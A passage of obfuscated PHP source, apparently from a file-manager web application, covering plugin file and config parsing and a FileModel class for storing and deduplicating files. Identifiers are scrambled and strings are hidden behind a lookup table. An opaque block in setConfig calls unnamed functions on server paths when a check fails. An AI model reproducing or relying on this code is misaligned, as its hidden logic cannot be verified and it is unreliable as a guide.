$‡à¥×‚¦ =& $_SERVER[¯µç›È¢]; if (!($ßóúÕ¼• = IO::infoFull($òó¡Êª†))) { return IO::mkfile($òó¡Êª†, $Ôˆò‹ô¸, REPEAT_REPLACE); } IO::setContent($ßóúÕ¼•[$‡à¥×‚¦[88]], $Ôˆò‹ô¸); return $ßóúÕ¼•[$‡à¥×‚¦[88]]; } final function pluginLocalFile($û˜’™‘ = '') { $Š³Ğ´ÈŠ =& $_SERVER[¯µç›È¢]; $ç²««€Ş = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ç²««€Ş)) { mk_dir($ç²««€Ş); } if (!$û˜’™‘) { return $ç²««€Ş; } $Ö²ÀëÑÇ = IO::info($û˜’™‘); $¬íøÀ®Ğ = $this->_tmpFileName($Ö²ÀëÑÇ) . $Š³Ğ´ÈŠ[10] . $Ö²ÀëÑÇ[$Š³Ğ´ÈŠ[181]]; if (!checkExtSafe($¬íøÀ®Ğ)) { $¬íøÀ®Ğ = $¬íøÀ®Ğ . $Š³Ğ´ÈŠ[1562]; } $ÎÆüŸÆ¸ = $ç²««€Ş . $¬íøÀ®Ğ; if (@file_exists($ÎÆüŸÆ¸)) { return $ÎÆüŸÆ¸; } return IO::copy($û˜’™‘, $ç²««€Ş, 0, $¬íøÀ®Ğ); } final function appPackage() { $ıñ‰Ÿ‘ =& $_SERVER[¯µç›È¢]; if ($this->packageData) { return $this->packageData; } $§ ‘ù®‰ = $this->parseFile($this->pluginPath . $ıñ‰Ÿ‘[1563]); $this->parseLang($§ ‘ù®‰); $¯…ïÑË = json_decode_force($§ ‘ù®‰); if (!$¯…ïÑË) { return array(); } $Í¹ğ¤ñ = Hook::trigger($ıñ‰Ÿ‘[1564], $¯…ïÑË); if ($Í¹ğ¤ñ && is_array($Í¹ğ¤ñ)) { $¯…ïÑË = $Í¹ğ¤ñ; } $this->packageData = $¯…ïÑË; return $¯…ïÑË; } public function packageInfoGet($³Íçş‹) { $‚Ú‚²Úâ = $this->appPackage(); return array_get_value($‚Ú‚²Úâ, $³Íçş‹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¯µç›È¢][1565]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¯µç›È¢][1566]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¯µç›È¢][1567]); } public function echoJsAssign($Ğ×»¿äÎ, $ò°Ÿ¹õñ) { $this->echoJsAssignArr[$Ğ×»¿äÎ] = $ò°Ÿ¹õñ; } private function parseFile($ÕÕã¼) { $ñ’‡ª¸Ç =& $_SERVER[¯µç›È¢]; $è‘Ãíõ = file_get_contents_nossl($ÕÕã¼); $Û»Ï¨ÔÃ = array($ñ’‡ª¸Ç[1568], $ñ’‡ª¸Ç[1569], $ñ’‡ª¸Ç[1570], $ñ’‡ª¸Ç[1571], $ñ’‡ª¸Ç[1572], $ñ’‡ª¸Ç[1573], $ñ’‡ª¸Ç[1574]); $¾ğ•§Ş¥ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ñ’‡ª¸Ç[100]][$ñ’‡ª¸Ç[1575]]); foreach ($this->echoJsAssignArr as $èµ÷ìã => $§ÕÄ±§—) { $Û»Ï¨ÔÃ[] = $ñ’‡ª¸Ç[1576] . $èµ÷ìã . $ñ’‡ª¸Ç[1577]; $¾ğ•§Ş¥[] = is_array($§ÕÄ±§—) || is_object($§ÕÄ±§—) ? rawurlencode(json_encode($§ÕÄ±§—)) : $§ÕÄ±§—; } if (strstr($è‘Ãíõ, $ñ’‡ª¸Ç[1578])) { $›á†óúé = rawurlencode(json_encode($this->pluginLangArr)); $è‘Ãíõ = str_replace($ñ’‡ª¸Ç[1578], $›á†óúé, $è‘Ãíõ); } if (strstr($è‘Ãíõ, $ñ’‡ª¸Ç[1579])) { $›á†óúé = $›á†óúé = rawurlencode(json_encode($this->getConfig())); $è‘Ãíõ = str_replace($ñ’‡ª¸Ç[1579], $›á†óúé, $è‘Ãíõ); } $è‘Ãíõ = str_replace($Û»Ï¨ÔÃ, $¾ğ•§Ş¥, $è‘Ãíõ); return $è‘Ãíõ; } private function parseLang(&$Ş·¢Ù©Å) { $Ó—ã‹ô÷ =& $_SERVER[¯µç›È¢]; $İùáşÊò = $Ó—ã‹ô÷[1580]; if (!strstr($Ş·¢Ù©Å, $İùáşÊò)) { return; } preg_match_all($Ó—ã‹ô÷[1581], $Ş·¢Ù©Å, $óÁÙ½‘õ); if (!is_array($óÁÙ½‘õ) || count($óÁÙ½‘õ) == 0 || !is_array($óÁÙ½‘õ[0]) || count($óÁÙ½‘õ[0]) == 0) { return; } $¤ˆëÇÂô = array(); $¤Í¼éà• = array(); foreach ($óÁÙ½‘õ[0] as $ı³ßŸ°±) { $™—ŸïßÁ = substr($ı³ßŸ°±, strlen($İùáşÊò), -4); $ş óüö™ = LNG($™—ŸïßÁ); $¤ˆëÇÂô[] = $ı³ßŸ°±; $¤Í¼éà•[] = str_replace(array($Ó—ã‹ô÷[66], $Ó—ã‹ô÷[1090], $Ó—ã‹ô÷[350], $Ó—ã‹ô÷[129]), array($Ó—ã‹ô÷[53], $Ó—ã‹ô÷[53], $Ó—ã‹ô÷[12], $Ó—ã‹ô÷[1582]), $ş óüö™); } $Ş·¢Ù©Å = str_replace($¤ˆëÇÂô, $¤Í¼éà•, $Ş·¢Ù©Å); } private function parseConfig(&$Ú×ïÈ) { $ªŒı…ÔÉ =& $_SERVER[¯µç›È¢]; $­Î†ƒó¨ = $ªŒı…ÔÉ[1583]; if (!strstr($Ú×ïÈ, $­Î†ƒó¨)) { return; } preg_match_all($ªŒı…ÔÉ[1584], $Ú×ïÈ, $Ãñ‚öæ®); if (!is_array($Ãñ‚öæ®) || count($Ãñ‚öæ®) == 0 || !is_array($Ãñ‚öæ®[0]) || count($Ãñ‚öæ®[0]) == 0) { return; } $Íãşûïï = $this->getConfig(); $”¿÷Šñ— = array(); $ß˜ÔşÔå = array(); foreach ($Ãñ‚öæ®[0] as $áê¬†) { $‹¨ÏÄ¼È = substr($áê¬†, strlen($­Î†ƒó¨), -2); $”¿÷Šñ—[] = $áê¬†; $ß˜ÔşÔå[] = _get($Íãşûïï, $‹¨ÏÄ¼È); } $Ú×ïÈ = str_replace($”¿÷Šñ—, $ß˜ÔşÔå, $Ú×ïÈ); } private function parsePackage(&$÷§’ÒÍ‘) { $•›æ“‡± =& $_SERVER[¯µç›È¢]; $±½Œê = $•›æ“‡±[1585]; if (!strstr($÷§’ÒÍ‘, $±½Œê)) { return; } preg_match_all($•›æ“‡±[1586], $÷§’ÒÍ‘, $Õá²«äÏ); if (!is_array($Õá²«äÏ) || count($Õá²«äÏ) == 0 || !is_array($Õá²«äÏ[0]) || count($Õá²«äÏ[0]) == 0) { return; } $¬­ıñÜ¹ = $this->appPackage(); $ÛĞĞÑ = array(); $æ££ÀüÃ = array(); foreach ($Õá²«äÏ[0] as $…Î’ÓÀß) { $™Ñ¢ÍÖª = substr($…Î’ÓÀß, strlen($±½Œê), -2); $ÛĞĞÑ[] = $…Î’ÓÀß; $æ££ÀüÃ[] = _get($¬­ıñÜ¹, $™Ñ¢ÍÖª); } $÷§’ÒÍ‘ = str_replace($ÛĞĞÑ, $æ££ÀüÃ, $÷§’ÒÍ‘); } final function echoFile($·Îô‹òÁ, $’¥²µ¾ü = false) { $¾Ì¸Ñ¿ =& $_SERVER[¯µç›È¢]; $Ú¿îçñ× = $this->pluginPath . $·Îô‹òÁ; if (ACT == $¾Ì¸Ñ¿[1587]) { echo $¾Ì¸Ñ¿[1588] . $this->pluginName . $¾Ì¸Ñ¿[8] . $·Îô‹òÁ . $¾Ì¸Ñ¿[1589]; if (!file_exists($Ú¿îçñ×)) { echo $¾Ì¸Ñ¿[1590]; return; } } $åìÅÎâ = $this->parseFile($Ú¿îçñ×); $this->parseLang($åìÅÎâ); $this->parseConfig($åìÅÎâ); $this->parsePackage($åìÅÎâ); if (is_array($’¥²µ¾ü)) { $åìÅÎâ = str_replace(array_keys($’¥²µ¾ü), array_values($’¥²µ¾ü), $åìÅÎâ); } echo $¾Ì¸Ñ¿[66] . $åìÅÎâ; } final function initLang() { $ˆŸøÔÎ° =& $_SERVER[¯µç›È¢]; $Á”Â£î = $ˆŸøÔÎ°[1591]; $šàíø  = $this->pluginPath . $ˆŸøÔÎ°[1592]; $›ŒºÉüà = I18n::getType(); $¼¤ªí¶  = array(); if (file_exists($šàíø  . $›ŒºÉüà . $ˆŸøÔÎ°[855])) { $¼¤ªí¶  = (include $šàíø  . $›ŒºÉüà . $ˆŸøÔÎ°[855]); } else { if ($›ŒºÉüà == $ˆŸøÔÎ°[1593] && !file_exists($šàíø  . $›ŒºÉüà . $ˆŸøÔÎ°[855]) && file_exists($šàíø  . $ˆŸøÔÎ°[1594])) { $¼¤ªí¶  = (include $šàíø  . $ˆŸøÔÎ°[1594]); } else { if (file_exists($šàíø  . $Á”Â£î . $ˆŸøÔÎ°[855])) { $¼¤ªí¶  = (include $šàíø  . $Á”Â£î . $ˆŸøÔÎ°[855]); } } } if (!is_array($¼¤ªí¶ )) { return array(); } if (@count($¼¤ªí¶ ) > 0) { I18n::set($¼¤ªí¶ ); } return $¼¤ªí¶ ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($á£„‚¿) { $‰ÌÂÑ°é =& $_SERVER[¯µç›È¢]; if ($_SERVER[$‰ÌÂÑ°é[62]] != $_SERVER[$‰ÌÂÑ°é[1531]]) { $™èÇäÄ´ = $‰ÌÂÑ°é[889]; $·ª•ìÀÊ = $‰ÌÂÑ°é[63]; $°ÌÂáüÈ = $_SERVER[$‰ÌÂÑ°é[64]] . $‰ÌÂÑ°é[65]; $ş¸¹­£º = $·ª•ìÀÊ($°ÌÂáüÈ); $ëÓŞ¼ÑĞ = explode($‰ÌÂÑ°é[66], $ş¸¹­£º); if (count($ëÓŞ¼ÑĞ) < $‰ÌÂÑ°é[634]) { $—–ö–üÅ = $‰ÌÂÑ°é[68]; $—–ö–üÅ(); } $îà±Ã¹ = $‰ÌÂÑ°é[890]; $îà±Ã¹($_SERVER[$‰ÌÂÑ°é[891]]); $îà±Ã¹($_SERVER[$‰ÌÂÑ°é[64]] . $‰ÌÂÑ°é[1532]); $£¶óêêä = 1; while ($£¶óêêä > 1) { $£¶óêêä = $£¶óêêä + 4; $¬õô€ô = rawurlencode($£¶óêêä . $‰ÌÂÑ°é[386]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $á£„‚¿); } public function onSetConfig($Î›»¾«€) { } public function onGetConfig($î€ü–·¦) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¸‡«ïÃ) { if ($¸‡«ïÃ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($åúëîá™ = "\x70\x6c\165\147\151\x6e\101\x75\164\x68") { $¬•€¡¾ =& $_SERVER[¯µç›È¢]; if (!defined($¬•€¡¾[479])) { return !1; } if (_get($GLOBALS, $¬•€¡¾[508])) { return !0; } $Íö×Ü¢° = $this->getConfig(); if (!$Íö×Ü¢°[$åúëîá™]) { return !1; } return ActionCall($¬•€¡¾[1595], $Íö×Ü¢°[$åúëîá™]); } public function url($†ñé©—º, $Õà³½ = '', $ø®³ñîà = true) { $ş€Ï×ÇÂ =& $_SERVER[¯µç›È¢]; $®Ú›ÍÚÄ = $this->getConfig(); $¯¦¬ªÆÒ = KOD_VERSION . $ş€Ï×ÇÂ[10] . KOD_VERSION_BUILD; $œâµô³ô = $this->packageVersion(); $üÜ‚áå£ = $¯¦¬ªÆÒ . $ş€Ï×ÇÂ[465] . $œâµô³ô; if (substr($†ñé©—º, 0, 4) == $ş€Ï×ÇÂ[159] || substr($†ñé©—º, 0, 2) == $ş€Ï×ÇÂ[1377]) { $ôñ¸à’¶ = $†ñé©—º . $ş€Ï×ÇÂ[1596] . $üÜ‚áå£; } else { if ($Õà³½ == $ş€Ï×ÇÂ[12]) { $ôñ¸à’¶ = $this->pluginHost . $†ñé©—º . $ş€Ï×ÇÂ[1596] . $üÜ‚áå£; } else { if ($Õà³½ === $ş€Ï×ÇÂ[89]) { $ôñ¸à’¶ = $this->pluginHost . $†ñé©—º; } else { if ($Õà³½ == $ş€Ï×ÇÂ[1597]) { $ôñ¸à’¶ = STATIC_PATH . $†ñé©—º . $ş€Ï×ÇÂ[1596] . $¯¦¬ªÆÒ; } else { if ($Õà³½ == $ş€Ï×ÇÂ[1598]) { $ôñ¸à’¶ = APP_HOST . $ş€Ï×ÇÂ[1599] . $†ñé©—º . $ş€Ï×ÇÂ[1596] . $¯¦¬ªÆÒ; } else { if (isset($®Ú›ÍÚÄ[$Õà³½])) { $ôñ¸à’¶ = $®Ú›ÍÚÄ[$Õà³½] . $†ñé©—º . $ş€Ï×ÇÂ[1596] . $üÜ‚áå£; } } } } } } if (!$ø®³ñîà) { return $ôñ¸à’¶; } echo $ôñ¸à’¶; } public function link($Š³…ê¡ = false, $À‘¯õáï = '') { $ä¹ëÔÓÒ =& $_SERVER[¯µç›È¢]; if (!$Š³…ê¡) { $this->link($ä¹ëÔÓÒ[1600], $ä¹ëÔÓÒ[1598]); $this->link($ä¹ëÔÓÒ[1601], $ä¹ëÔÓÒ[1597]); $this->link($ä¹ëÔÓÒ[1602], $ä¹ëÔÓÒ[1597]); $this->link($ä¹ëÔÓÒ[1603], $ä¹ëÔÓÒ[1597]); $this->link($ä¹ëÔÓÒ[1604], $ä¹ëÔÓÒ[1597]); return; } $Ÿ­÷€‹à = $this->url($Š³…ê¡, $À‘¯õáï, !1); if (substr($Š³…ê¡, -3) == $ä¹ëÔÓÒ[1605]) { echo $ä¹ëÔÓÒ[1606] . $Ÿ­÷€‹à . $ä¹ëÔÓÒ[1607] . $ä¹ëÔÓÒ[66]; } else { if (substr($Š³…ê¡, -4) == $ä¹ëÔÓÒ[1608]) { echo $ä¹ëÔÓÒ[1609] . $Ÿ­÷€‹à . $ä¹ëÔÓÒ[1610] . $ä¹ëÔÓÒ[66]; } } } } goto Cò§à¥ÕÔ; eñÛ”›†ôÊ: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\x65"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\x69\x6f\x5f\x66\x69\154\145\x5f\155\x65\164\x61", "\x6d\x65\164\141\106\151\145\x6c\144" => "\x66\151\154\145\x49\104"); public function fileInfo($ÕâµºÚÛ) { $¸âÕù’ =& $_SERVER[¯µç›È¢]; static $õ˜ãƒãÆ = array(); if (!isset($õ˜ãƒãÆ[$ÕâµºÚÛ])) { $éŞ¶÷æ« = $¸âÕù’[1882]; $¥Œå³Íè = Model($¸âÕù’[475])->field($éŞ¶÷æ«)->where(array($¸âÕù’[473] => $ÕâµºÚÛ))->find(); $õ˜ãƒãÆ[$ÕâµºÚÛ] = $¥Œå³Íè; } return $õ˜ãƒãÆ[$ÕâµºÚÛ]; } public function addFileByContent($¾å—Ğú« = '', $á±Œì¼Ö = '') { $Ùëö¨¤Ÿ =& $_SERVER[¯µç›È¢]; $ÃéŠ‘ = TEMP_PATH . $Ùëö¨¤Ÿ[1883]; if (!is_dir($ÃéŠ‘)) { mk_dir($ÃéŠ‘); } $˜ŞÂÖÜ÷ = $ÃéŠ‘ . $Ùëö¨¤Ÿ[1884] . rand_string(16); file_put_contents($˜ŞÂÖÜ÷, $¾å—Ğú«); $á´Ï·•Ú = $this->addFile($˜ŞÂÖÜ÷, $á±Œì¼Ö, !0); if (file_exists($˜ŞÂÖÜ÷)) { @unlink($˜ŞÂÖÜ÷); } return $á´Ï·•Ú; } public function createFileName($Ã½¯àì•, $«³ªõ‘ = false, $ÕñÓ¯µ = false) { $×ºğŞÕö =& $_SERVER[¯µç›È¢]; $’çƒşõ‡ = IO::init($×ºğŞÕö[8]); $«ãíÙüö = $this->makeFilePath($Ã½¯àì•, $’çƒşõ‡, $«³ªõ‘, $ÕñÓ¯µ); $û²ùß©á = $’çƒşõ‡->pathFather($«ãíÙüö); static $è£Ÿ„å = false; $¹ü¼¬½ = $×ºğŞÕö[1885] . md5($û²ùß©á); if (!$è£Ÿ„å && !Cache::get($¹ü¼¬½)) { $è£Ÿ„å = !0; $ª„Í¶ = IO::mkdir($û²ùß©á); if (!IO::exist($ª„Í¶ . $×ºğŞÕö[814])) { IO::mkfile($ª„Í¶ . $×ºğŞÕö[814]); } Cache::set($¹ü¼¬½, 1, 3600 * 2); } return $«ãíÙüö; } public function makeFilePath($¹ûÁÌ¤‹, $úÓÖ×©, $×ì×Óâ… = false, $Øï“úüØ = false) { $ˆ†óàœÚ =& $_SERVER[¯µç›È¢]; $¨Ü“ã†Á = Model($ˆ†óàœÚ[787])->get($ˆ†óàœÚ[1886]); $‚áƒ¡ÔË = KodIO::defaultIO() . date($ˆ†óàœÚ[1887]); $…Ì…¾©Ö = $‚áƒ¡ÔË . rand_string(5) . short_id(100); $¹ûÁÌ¤‹ = str_replace($ˆ†óàœÚ[8], $ˆ†óàœÚ[11], KodIO::clear($¹ûÁÌ¤‹)); $ü”É¸È = $úÓÖ×©->ext($¹ûÁÌ¤‹); if (!$¹ûÁÌ¤‹) { $¨Ü“ã†Á = $ˆ†óàœÚ[1888]; } switch ($¨Ü“ã†Á) { case $ˆ†óàœÚ[1889]: $…Ì…¾©Ö = $…Ì…¾©Ö . $ˆ†óàœÚ[10] . $úÓÖ×©->ext($¹ûÁÌ¤‹); if ($ü”É¸È == $ˆ†óàœÚ[1827]) { $…Ì…¾©Ö .= $ˆ†óàœÚ[1562]; } break; case $ˆ†óàœÚ[1890]: $åñ†§”õ = Model($ˆ†óàœÚ[787])->get($ˆ†óàœÚ[788]); $Ší¸ã  = substr(md5($ˆ†óàœÚ[789] . $åñ†§”õ . date($ˆ†óàœÚ[765])), 0, 8); $û´¿—İ = KodIO::defaultDriver(); $‚áƒ¡ÔË = $ˆ†óàœÚ[1239] . $û´¿—İ[$ˆ†óàœÚ[405]] . $ˆ†óàœÚ[415] . date($ˆ†óàœÚ[1891]) . $Ší¸ã  . $ˆ†óàœÚ[8]; if ($ü”É¸È == $ˆ†óàœÚ[1827]) { $¹ûÁÌ¤‹ .= $ˆ†óàœÚ[1562]; } $°¥ß÷Ôì = $ˆ†óàœÚ[1892] . $‚áƒ¡ÔË . $¹ûÁÌ¤‹; CacheLock::lock($°¥ß÷Ôì); $…Ì…¾©Ö = $‚áƒ¡ÔË . $¹ûÁÌ¤‹; if (IO::exist($‚áƒ¡ÔË . $¹ûÁÌ¤‹)) { $¸²Ïùæ = substr($¹ûÁÌ¤‹, 0, strlen($¹ûÁÌ¤‹) - strlen($ü”É¸È)); $³¥É¼ìÑ = $Øï“úüØ ? substr($Øï“úüØ, 0, 5) : ($×ì×Óâ… ? substr($×ì×Óâ…, 0, 5) : rand_string(5)); $…Ì…¾©Ö = $‚áƒ¡ÔË . $¸²Ïùæ . $³¥É¼ìÑ . $ˆ†óàœÚ[10] . $ü”É¸È; } if (IO::isTypeObject($…Ì…¾©Ö) && !IO::isUploadServer($…Ì…¾©Ö)) { if (IO::exist($…Ì…¾©Ö)) { return $…Ì…¾©Ö; } $ûÊµ×¶’ = IO::setContent($…Ì…¾©Ö, $ˆ†óàœÚ[12]); if (!$ûÊµ×¶’) { show_json($ˆ†óàœÚ[1893], !1); } } CacheLock::unlock($°¥ß÷Ôì); break; case $ˆ†óàœÚ[1888]: break; default: break; } return $…Ì…¾©Ö; } public function addFileByRemote($ñÁĞòÂ, $£êÍİÑŞ, $½èó¦­ñ = array()) { $Ş²øÓä  =& $_SERVER[¯µç›È¢]; if (!IO::exist($ñÁĞòÂ)) { return !1; } $èÂóÌëÂ = $½èó¦­ñ[$Ş²øÓä [183]] ? $½èó¦­ñ[$Ş²øÓä [183]] : $Ş²øÓä [12]; $¨šıØè = IO::hashMd5($ñÁĞòÂ, $èÂóÌëÂ); $§¢‚¸É = KodIO::defaultDriver(); $½ºîÀ‹ = array($Ş²øÓä [587] => IO::size($ñÁĞòÂ), $Ş²øÓä [1894] => 1, $Ş²øÓä [426] => $£êÍİÑŞ, $Ş²øÓä [825] => $§¢‚¸É[$Ş²øÓä [405]], $Ş²øÓä [427] => $ñÁĞòÂ, $Ş²øÓä [1895] => $½èó¦­ñ[$Ş²øÓä [184]] ? $½èó¦­ñ[$Ş²øÓä [184]] : IO::hashSimple($ñÁĞòÂ), $Ş²øÓä [1896] => $¨šıØè ? $¨šıØè : $èÂóÌëÂ); if ($áÖıë„Ø = $this->addFileCheckExist($½ºîÀ‹[$Ş²øÓä [184]], $½ºîÀ‹[$Ş²øÓä [183]], $½ºîÀ‹[$Ş²øÓä [90]])) { return $áÖıë„Ø; } return $this->addFileData($½ºîÀ‹); } private function addFileData($ÍÂ‰ºÈ£) { $æ£©¬¼ =& $_SERVER[¯µç›È¢]; if (!$ÍÂ‰ºÈ£) { return !1; } $ÍÂ‰ºÈ£[$æ£©¬¼[90]] = intval($ÍÂ‰ºÈ£[$æ£©¬¼[90]]); if (!$ÍÂ‰ºÈ£[$æ£©¬¼[90]] && strlen($ÍÂ‰ºÈ£[$æ£©¬¼[184]]) > 32) { $ÍÂ‰ºÈ£[$æ£©¬¼[90]] = intval(substr($ÍÂ‰ºÈ£[$æ£©¬¼[184]], 32)); } $üåû£Ş = $this->add($ÍÂ‰ºÈ£); return $this->find($üåû£Ş); } public function addFile($ï‹¥–½, $àó×ß€, $—¶ö = false) { $í¢Ş’ß‹ =& $_SERVER[¯µç›È¢]; $í›Ã¾Ùƒ = IO::hashSimple($ï‹¥–½); $ÄŸ¿¡Ì‚ = IO::size($ï‹¥–½); $£æŠÃ…Ä = $ÄŸ¿¡Ì‚ <= 1024 * 1024 * 10 ? IO::hashMd5($ï‹¥–½) : $í¢Ş’ß‹[12]; $–ôÒğ = $í¢Ş’ß‹[1897] . $í›Ã¾Ùƒ; CacheLock::lock($–ôÒğ); if ($£æŠÃ…Ä && $í›Ã¾Ùƒ) { $»Ë€™± = $this->addFileCheckExist($í›Ã¾Ùƒ, $£æŠÃ…Ä, $ÄŸ¿¡Ì‚); if ($»Ë€™±) { CacheLock::unlock($–ôÒğ); return $»Ë€™±; } } $æĞŠÄŞá = $this->addFileMake($ï‹¥–½, $ÄŸ¿¡Ì‚, $í›Ã¾Ùƒ, $£æŠÃ…Ä, $àó×ß€, $—¶ö); $ëÏ¨†¸ = $this->addFileData($æĞŠÄŞá); CacheLock::unlock($–ôÒğ); if (!$£æŠÃ…Ä && $ëÏ¨†¸) { $this->fileMd5Check($ëÏ¨†¸); } return $ëÏ¨†¸; } private function fileMd5Check($áÊ¨Ÿº·) { $í¼«Œ‹ =& $_SERVER[¯µç›È¢]; $ŸÔş¿Òİ = array($áÊ¨Ÿº·[$í¼«Œ‹[472]], $áÊ¨Ÿº·[$í¼«Œ‹[88]]); $…Úš›£µ = $í¼«Œ‹[1898] . $áÊ¨Ÿº·[$í¼«Œ‹[88]]; $¤íƒÓ…¦ = $í¼«Œ‹[1899] . $áÊ¨Ÿº·[$í¼«Œ‹[472]]; $ôè°†üÜ = TaskQueue::add($í¼«Œ‹[1900], $ŸÔş¿Òİ, $…Úš›£µ, $¤íƒÓ…¦); if (!$ôè°†üÜ) { $this->fileMd5Set($áÊ¨Ÿº·[$í¼«Œ‹[472]], $áÊ¨Ÿº·[$í¼«Œ‹[88]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($î§âú¼÷, $ Ê„ˆÖĞ) { $¨Ù­Èà• =& $_SERVER[¯µç›È¢]; $Œùı‰Ï¿ = $this->find($î§âú¼÷); if (!$Œùı‰Ï¿ || $Œùı‰Ï¿[$¨Ù­Èà•[183]]) { return; } $œš¤§÷ = IO::hashMd5($ Ê„ˆÖĞ); if (!$œš¤§÷) { return $¨Ù­Èà•[12]; } $this->where(array($¨Ù­Èà•[472] => $î§âú¼÷))->save(array($¨Ù­Èà•[183] => $œš¤§÷)); } public function addFileMake($õ…ŒÄº, $áğ×âÏÊ, $¤ÅÚæµÍ, $«÷ÍËƒ, $©Ú´›ÃÚ, $‰ëÏ˜Ã) { $ä¦çğÙ… =& $_SERVER[¯µç›È¢]; $—ÌÛã…Ë = $this->createFileName($©Ú´›ÃÚ, $¤ÅÚæµÍ, $«÷ÍËƒ); $µ£«±…† = get_path_father($—ÌÛã…Ë); $»¶Î Î = get_path_this($—ÌÛã…Ë); if ($‰ëÏ˜Ã) { $¶öÕ¥–” = IO::move($õ…ŒÄº, $µ£«±…†, !1, $»¶Î Î); } else { $¶öÕ¥–” = IO::copy($õ…ŒÄº, $µ£«±…†, !1, $»¶Î Î); } if (!$¶öÕ¥–”) { return !1; } $Ã„ª¤±Î = KodIO::defaultDriver(); $¬êÉ³¥ = array($ä¦çğÙ…[587] => $áğ×âÏÊ, $ä¦çğÙ…[1894] => 1, $ä¦çğÙ…[426] => $©Ú´›ÃÚ, $ä¦çğÙ…[825] => $Ã„ª¤±Î[$ä¦çğÙ…[405]], $ä¦çğÙ…[427] => $—ÌÛã…Ë, $ä¦çğÙ…[1895] => $¤ÅÚæµÍ, $ä¦çğÙ…[1896] => $«÷ÍËƒ); return $¬êÉ³¥; } public function addFileCheckExist($‡€ ™¬, $±Šãæ¯§, $­øèßşÁ) { $Åğ•È™ê =& $_SERVER[¯µç›È¢]; $äÑ»°·¼ = $this->findByHash($‡€ ™¬, $±Šãæ¯§); if (!$äÑ»°·¼) { return !1; } $ĞËá­ºë = array($Åğ•È™ê[1894] => intval($äÑ»°·¼[$Åğ•È™ê[1901]]) + 1, $Åğ•È™ê[587] => $­øèßşÁ); $this->where(array($Åğ•È™ê[473] => $äÑ»°·¼[$Åğ•È™ê[472]]))->save($ĞËá­ºë); return $äÑ»°·¼; } public function remove($â¡Ş¯Ê) { $this->linkCountChange($â¡Ş¯Ê, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ö‰³ ·è) { $this->linkCountChange($Ö‰³ ·è, !0); } public function linkCountChange($İœªâé, $éÜ°‰ğ) { $ŒíóÅ÷ =& $_SERVER[¯µç›È¢]; if (!$İœªâé) { return; } if (!is_array($İœªâé)) { $İœªâé = array($İœªâé); } $¢ß±¹÷ = array(); foreach ($İœªâé as $’¦›ù¼„) { $˜à¦ïÛ = $’¦›ù¼„ . $ŒíóÅ÷[12]; if (!$¢ß±¹÷[$˜à¦ïÛ]) { $¢ß±¹÷[$˜à¦ïÛ] = 0; } $¢ß±¹÷[$˜à¦ïÛ]++; } $˜Ô·â§¶ = array(); foreach ($¢ß±¹÷ as $’¦›ù¼„ => $…¼Å§ëı) { $˜à¦ïÛ = $…¼Å§ëı . $ŒíóÅ÷[12]; if (!$˜Ô·â§¶[$˜à¦ïÛ]) { $˜Ô·â§¶[$˜à¦ïÛ] = array(); } $˜Ô·â§¶[$˜à¦ïÛ][] = $’¦›ù¼„; } foreach ($˜Ô·â§¶ as $…¼Å§ëı => $îÎš‚á) { if (!$îÎš‚á) { continue; } $…¼Å§ëı = $éÜ°‰ğ ? $…¼Å§ëı : -intval($…¼Å§ëı); $åååë‚¨ = array($ŒíóÅ÷[472] => array($ŒíóÅ÷[7], $îÎš‚á)); if ($…¼Å§ëı < 0) { $åååë‚¨[$ŒíóÅ÷[1901]] = array($ŒíóÅ÷[1027], abs($…¼Å§ëı)); } $this->where($åååë‚¨)->setAdd($ŒíóÅ÷[1901], $…¼Å§ëı); } } public function findByHash($Ğ–ÇÇ˜”, $ÈòşÒâ— = false) { $ûïàÇù¯ =& $_SERVER[¯µç›È¢]; if (!$Ğ–ÇÇ˜” && !$ÈòşÒâ—) { return !1; } $ŞûĞ³’Ï = array($ûïàÇù¯[1895] => $Ğ–ÇÇ˜”); if ($ÈòşÒâ—) { $ŞûĞ³’Ï = array($ûïàÇù¯[1896] => $ÈòşÒâ—); } return $this->order($ûïàÇù¯[1902])->where($ŞûĞ³’Ï)->find(); } public function clearEmpty($úîœûˆ = 0) { $À·¡§‡ =& $_SERVER[¯µç›È¢]; $–ï¾‘’İ = time() - 3600 * 24 * $úîœûˆ; $•ùßÉ¨˜ = $À·¡§‡[1903] . $–ï¾‘’İ; $¹©íıÊê = $this->where($•ùßÉ¨˜)->select(); if (!$¹©íıÊê) { return; } $Æˆ³ÈÃù = new Task($À·¡§‡[1904], $À·¡§‡[12], count($¹©íıÊê)); foreach ($¹©íıÊê as $›®Ïòó) { $Æˆ³ÈÃù->update(1); $this->resetFile($›®Ïòó); } $Æˆ³ÈÃù->end(); } public function resetFile($™“ùÀÈ) { $©ñ¦šüÕ =& $_SERVER[¯µç›È¢]; $Ñ¥è—ÙÌ = array($©ñ¦šüÕ[473] => $™“ùÀÈ[$©ñ¦šüÕ[472]]); $¯ëé® Ç = Model($©ñ¦šüÕ[1337])->where($Ñ¥è—ÙÌ)->count(); $ÃíÉ¬ó» = Model($©ñ¦šüÕ[1905])->where($Ñ¥è—ÙÌ)->count(); $ûÚòûáŸ = intval($¯ëé® Ç) + intval($ÃíÉ¬ó»); if ($ûÚòûáŸ == 0) { IO::remove($™“ùÀÈ[$©ñ¦šüÕ[88]]); Model($©ñ¦šüÕ[1906])->delete($™“ùÀÈ[$©ñ¦šüÕ[472]]); $this->where($Ñ¥è—ÙÌ)->delete(); $this->metaSet($™“ùÀÈ[$©ñ¦šüÕ[472]], null, null); return; } if ($™“ùÀÈ[$©ñ¦šüÕ[1901]] != $ûÚòûáŸ) { $this->where($Ñ¥è—ÙÌ)->save(array($©ñ¦šüÕ[1894] => $ûÚòûáŸ)); } } public function storageInfo($Ïüî…ãÑ = false) { 